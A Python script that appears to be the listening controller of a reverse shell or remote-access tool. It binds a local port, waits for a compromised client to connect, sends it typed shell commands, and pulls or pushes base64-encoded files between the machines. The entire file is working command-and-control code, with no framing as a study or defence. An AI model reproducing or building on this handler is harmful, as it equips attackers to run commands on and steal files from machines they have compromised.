import socket
import sys
import json
import base64

def create_socket():
    try:
        global host
        global port
        global s
        host = "localhost"
        port = 9999
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))
        s.bind((host, port))
        s.listen(1)
        print("[+] Waiting for Incoming Connection")
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

def reliable_send(conn, data):
    json_data = json.dumps(data)
    conn.send(str.encode(json_data))

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Download Successful"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode("utf-8")

def reliable_receive(conn):
    json_data = ""
    while True:
        try:
            json_data = json_data + conn.recv(1024).decode("utf-8")
            return json.loads(json_data)
        except ValueError:
            continue

def execute_remotely(conn, command):
    reliable_send(conn, command)
    client_response = reliable_receive(conn)
    return client_response

def send_commands(conn):
    while True:
        cmd = input()
        cmd = cmd.split(" ")
        if len(cmd) > 0:
            if cmd[0] in ['quit', 'exit']:
                conn.close()
                s.close()
                sys.exit()
            if cmd[0] == "download":
                result = execute_remotely(conn, cmd)
                if "[-] Error " not in result:
                    result = write_file(cmd[1], result)
            elif cmd[0] == "upload":
                file_content = read_file(cmd[1])
                cmd.append(file_content)
                result = execute_remotely(conn, cmd)
            else:
                result = execute_remotely(conn, cmd)
        print(result,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()